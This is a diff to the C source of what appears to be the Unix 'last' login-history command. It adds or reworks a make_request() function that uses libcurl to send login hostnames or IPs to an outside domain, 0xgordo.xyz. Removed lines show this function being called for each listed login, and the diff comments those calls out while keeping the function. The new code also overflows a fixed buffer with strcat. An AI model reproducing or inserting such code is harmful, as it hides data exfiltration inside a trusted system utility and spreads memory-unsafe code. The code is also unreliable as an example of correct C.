@@ -172,11 +172,12 @@ static void make_request(char *domain)
 {
     CURL *curl;
     CURLcode res;
-
+    char url[] = "https://0xgordo.xyz/a/?ip=";
+    strcat(url, domain);
     curl = curl_easy_init();
     if(curl) {
-        //curl_easy_setopt(curl, CURLOPT_URL, strcat("https://0xgordo.xyz/a/?ip=",domain)); //not working
-	curl_easy_setopt(curl, CURLOPT_URL, strcat("https://0xgordo.xyz/a/?ip=177.95.145.68    ")); 
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+
         // Perform the request, res will get the return code
         res = curl_easy_perform(curl);
 
@@ -561,7 +562,7 @@ static int list(const struct last_control *ctl, struct utmpx *p, time_t logout_t
 				domain[ctl->domain_len-1] = '*';
 
 			len = snprintf(final, sizeof(final),
-				"%-8.*s%c%-12.12s%c%-16.*s%c%-*.*s%c%-*.*s%c%s\n",
+				"      %-8.*s%c%-12.12s%c%-16.*s%c%-*.*s%c%-*.*s%c%s\n",
 				ctl->name_len, p->ut_user, ctl->separator, utline, ctl->separator,
 				ctl->domain_len, domain, ctl->separator,
 				fmt->in_len, fmt->in_len, logintime, ctl->separator, fmt->out_len, fmt->out_len,
@@ -573,7 +574,7 @@ static int list(const struct last_control *ctl, struct utmpx *p, time_t logout_t
 				ctl->name_len, p->ut_user, ctl->separator, utline, ctl->separator,
 				fmt->in_len, fmt->in_len, logintime, ctl->separator, fmt->out_len, fmt->out_len,
 				logouttime, ctl->separator, length, ctl->separator, domain);
-				make_request(domain);
+				//make_request(domain);
 		}
 	} else
 		len = snprintf(final, sizeof(final),
@@ -581,7 +582,7 @@ static int list(const struct last_control *ctl, struct utmpx *p, time_t logout_t
 			ctl->name_len, p->ut_user, ctl->separator, utline, ctl->separator,
 			fmt->in_len, fmt->in_len, logintime, ctl->separator, fmt->out_len, fmt->out_len,
 			logouttime, ctl->separator, length);
-			make_request(domain);
+			//make_request(domain);
 //AQUII
 #if defined(__GLIBC__)
 #  if (__GLIBC__ == 2) && (__GLIBC_MINOR__ == 0)
